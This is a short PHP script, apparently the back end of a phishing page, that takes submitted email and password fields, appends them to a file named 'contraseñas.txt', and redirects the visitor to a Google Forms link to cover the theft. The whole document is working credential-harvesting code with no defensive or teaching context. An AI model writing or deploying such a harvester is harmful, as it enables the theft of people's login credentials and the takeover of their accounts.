<?php
file_put_contents("contraseñas.txt", "Usuario: " .$_POST['email'] . "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location : https://forms.gle/13GN5LVPEVi9aJjHA');
exit();
